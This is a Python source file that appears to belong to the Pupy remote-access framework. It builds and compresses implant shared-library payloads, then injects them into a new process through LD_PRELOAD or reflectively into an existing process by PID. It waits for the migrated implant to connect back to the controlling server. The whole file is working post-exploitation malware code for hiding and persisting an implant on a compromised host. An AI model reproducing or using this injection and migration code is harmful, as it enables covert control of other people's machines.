import pupygen
import time
import gzip, cStringIO

def has_proc_migrated(client, pid):
    for c in client.pupsrv.clients:
        if all([
            True for x in c.desc if x in [
                "hostname",
                "platform",
                "release",
                "version",
                "macaddr"
            ] and client.desc[x]==c.desc[x]
        ]):
            if int(c.desc["pid"])==pid:
                return c
    return None

def get_payload(module, compressed=True):
    if module.client.is_proc_arch_64_bits():
        module.info('Generate pupyx64.so payload')
        dllbuf = pupygen.get_edit_pupyx64_so(module.client.get_conf())
    else:
        module.info('Generate pupyx86.so payload')
        dllbuf = pupygen.get_edit_pupyx86_so(module.client.get_conf())

    if not compressed:
        return dllbuf

    dllgzbuf = cStringIO.StringIO()
    gzf = gzip.GzipFile('pupy.so', 'wb', 9, dllgzbuf)
    gzf.write(dllbuf)
    gzf.close()

    return dllgzbuf.getvalue()

def wait_connect(module, pid):
    module.success("waiting for a connection from the DLL ...")
    while True:
        c=has_proc_migrated(module.client, pid)
        if c:
            module.success("got a connection from migrated DLL !")
            c.desc["id"]=module.client.desc["id"]
            break
        time.sleep(0.1)
    try:
        module.client.conn.exit()
    except Exception:
        pass

def ld_preload(module, command, wait_thread=False, keep=False):
    payload = get_payload(module)

    pid = module.client.conn.modules['pupy'].ld_preload_inject_dll(
        command, payload, wait_thread
    )

    if pid == -1:
        module.error('Inject failed')
        return
    else:
        module.success('Process created: {}'.format(pid))

    if not keep:
        wait_connect(module, pid)

def migrate(module, pid, keep=False):
    payload = get_payload(module)

    r = module.client.conn.modules['pupy'].reflective_inject_dll(
        pid, payload, 0
    )

    if r:
        module.success("DLL injected !")
    else:
        module.error("Injection failed !")
        return

    if not keep:
        wait_connect(module, pid)
